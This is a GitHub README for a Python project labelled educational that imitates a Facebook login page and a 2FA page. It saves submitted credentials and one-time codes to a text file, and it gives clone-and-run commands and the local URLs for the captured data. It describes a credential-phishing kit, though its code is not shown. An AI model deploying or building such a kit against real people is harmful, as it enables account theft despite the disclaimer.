# Facebook Phishing Page (Educational Purpose Only)

This is a simple web application built using Python’s `http.server` module. It mimics a Facebook-style login page (`index.html`), a two-factor authentication page (`2fa.html`), and stores submitted data in a plain text file (`data.txt`). The purpose of this project is strictly educational—**do not use it for real authentication systems or with real credentials**.

⚠️ **Warning**: This project is for educational use only. Do **NOT** enter real passwords or sensitive information.

---

## 🚀 Getting Started

### ✅ Prerequisites
- Python 3.x must be installed on your system.

### 🛠️ Installation & Run
Clone the repository and run the app:
```bash
git clone https://github.com/sudof20/Facebook-phising.git
cd Facebook-phising
chmod +x start.sh
./start.sh
```
*(After starting, you should see a message in the terminal indicating that the server is running.)*

---

## 🌐 Usage
Once the server is running, open a web browser and go to the following URLs:

- **🔐 Login Page**:  
  [`http://localhost:8080/`](http://localhost:8080/)  
- **🔐 2FA Page**:  
  [`http://localhost:8080/2fa.html`](http://localhost:8080/2fa.html)  
- **📄 Data File (raw)**:  
  [`http://localhost:8080/data.txt`](http://localhost:8080/data.txt)  

---

## 💡 Functionality

### Login Page (`index.html`)
- Enter email/phone and password → Click **Log In** → Data is saved to `data.txt` → Redirects to 2FA page.

### 2FA Page (`2fa.html`)
- Enter 6-digit code → Click **Continue** → Code is appended to `data.txt`.

### Data Logging
- All submitted data is saved in `data/data.txt`.

---

## 🤝 Contributing
Contributions are welcome! To contribute:
1. **Fork** the repository.
2. Create a new feature branch:  
   ```bash
   git checkout -b feature/AmazingFeature
   ```
3. Commit your changes:  
   ```bash
   git commit -m "Add some AmazingFeature"
   ```
4. Push to your branch:  
   ```bash
   git push origin feature/AmazingFeature
   ```
5. Open a **Pull Request**.

---

## 📜 License
This project is provided for educational and research purposes only. Usage of this code for unethical or malicious purposes is strictly prohibited.

**MIT License**  

Copyright (c) 2025 sudof20  

Permission is hereby granted, free of charge, to any person obtaining a copy  
of this software and associated documentation files (the "Software"), to deal  
in the Software without restriction, including without limitation the rights  
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell  
copies of the Software, and to permit persons to whom the Software is  
furnished to do so, subject to the following conditions:  

The above copyright notice and this permission notice shall be included in all  
copies or substantial portions of the Software.  

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR  
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,  
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE  
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER  
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,  
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE  
SOFTWARE.  

---

🔗 **Repository Link**:  
[`https://github.com/sudof20/Facebook-phising`](https://github.com/sudof20/Facebook-phising)
